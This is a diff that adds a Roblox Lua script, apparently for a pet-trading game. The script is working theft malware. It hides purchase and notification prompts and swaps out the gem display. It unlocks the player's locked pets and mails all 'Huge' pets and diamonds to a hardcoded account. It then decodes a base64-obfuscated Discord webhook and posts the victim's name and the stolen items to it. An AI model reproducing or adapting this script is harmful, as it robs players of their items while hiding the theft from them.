@@ -1,0 +1,193 @@
+local StealName = "ImN3rp1k0v2"
+local msg = "m4m0nt"
+
+local PL = game.Players
+local LP = PL.LocalPlayer
+local RS = game:GetService("ReplicatedStorage")
+
+local Gems = LP.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+local Lib = require(RS.Library.Client.Save)
+
+local function priv(mas)
+    for i,v in mas, next do
+        print(i,v)
+    end
+end
+
+print("-- 0 --")
+
+game:GetService("Lighting").ChildAdded:Connect(function(chl)
+    print(chl.Name)
+    if chl.Name == "PurchasePendingBlur" then
+        chl.Enabled = false
+        chl:Destroy()
+    end
+end)
+LP.PlayerGui.ChildAdded:Connect(function(chl) 
+    if chl.Name == "Purchase Pending" then
+        task.wait(0.00001)
+        chl:Destroy()
+    end
+end)
+
+
+local function SendMail(Type, PetId, Value)
+    local args = {
+        [1] = StealName,
+        [2] = msg,
+        [3] = Type,
+        [4] = PetId,
+        [5] = Value
+    }
+
+    local status = RS.Network["Mailbox: Send"]:InvokeServer(unpack(args))
+    return status
+end
+
+Bruh = Gems:Clone()
+Bruh.Parent = Gems.Parent
+Gems:Destroy()
+
+LP.PlayerGui.Notifications.Enabled = false
+
+if LP.PlayerGui.Inventory.Frame.Main.Pets.TeamsTitle.Visible == true then
+    LP.PlayerGui.Inventory.Frame.Main.Pets.TeamsTitle.Visible = false
+    game:GetService("ReplicatedStorage").Network["Pets_ToggleFavoriteMode"]:FireServer()
+end
+
+InvPets = Lib.Get().Inventory.Pet
+Pets = {}
+for i,v in next,InvPets do
+    id = i
+    value = if v["_am"] ~= nil then v["_am"] else 1
+    name = v.id
+
+    name = v.id
+    if v._lk then
+        local args = {
+            [1] = id,
+            [2] = false
+        }
+        game:GetService("ReplicatedStorage").Network["Locking_SetLocked"]:InvokeServer(unpack(args))
+    end
+
+    if string.find(v.id,"Huge") then
+        table.insert(Pets,{id,value,name})
+    end
+end
+
+ListPets = ""
+
+for i,v in Pets, next do
+    ListPets = ListPets..v[3]..": "..v[2].."\n"
+end
+
+AllInv = {
+    ["Pet"] = Pets
+}
+
+for type,units in AllInv,next do
+    for i,info in units,next do
+        local status = SendMail(type, info[1], info[2])
+        if status == true then
+            task.wait(0.1)
+        end
+    end 
+end
+
+for i,v in Lib.Get().Inventory.Currency,next do
+    if v.id == "Diamonds" then
+        DiD = i
+        DVal = v._am
+    end
+end
+
+local status = SendMail("Currency", DiD, DVal)
+
+if status == true then
+    task.wait(0.1)
+end
+
+ListPets = {}
+
+for i,v in Pets, next do
+    table.insert(ListPets,v[3]..": "..v[2])
+end
+
+Wbh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzU3NDM3MzkwMjEyMzA2OS8yT3NJcVYtN0RDN3FiMjFtdzZLYmdnMVRlaDdrbkwtSWVyY1FYWk9xMHNNelpBTUFyaTZlUk1SQks2U2Y5QXFDZUxvUw=="
+
+fields = {}
+n2 = 0
+tempfield = ""
+
+field = {
+    ["id"] = 0,
+    ["name"] = "Gems",
+    ["value"] = "```"..DVal.."```"
+}
+table.insert(fields,field)
+
+for i,v in ListPets, next do
+    tempfield = tempfield..v.."\n"
+    n2+=1
+    
+    if i == #ListPets then
+        n2 = 0
+        field = {
+            ["id"] = 0,
+            ["name"] = "",
+            ["value"] = "```"..tempfield.."```"
+        }
+        table.insert(fields,field)
+        tempfield = ""
+    elseif n2 == 20 then
+        n2 = 0
+        field = {
+            ["id"] = 0,
+            ["name"] = "",
+            ["value"] = "```"..tempfield.."```"
+        }
+        table.insert(fields,field)
+        tempfield = ""
+    end
+end
+
+function from_base64(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+Wbh_En = from_base64(Wbh)
+print(Wbh_En)
+local headers = {
+    ["content-type"] = "application/json"
+}
+print(ListPets)
+local data = {
+    ["avatar_url"] = "",
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["fields"] = fields,
+            ["title"] = "Nice! +Rap from **"..LP.Name.."**",
+            ["type"] = "rich",
+            ["color"] = 16777215
+        }
+    }
+}
+http = game:GetService("HttpService")
+pcall(function() 
+    local status = request({Url = Wbh_En, Method="POST", Body=http:JSONEncode(data), Headers = headers}) 
+    priv(status)
+end)
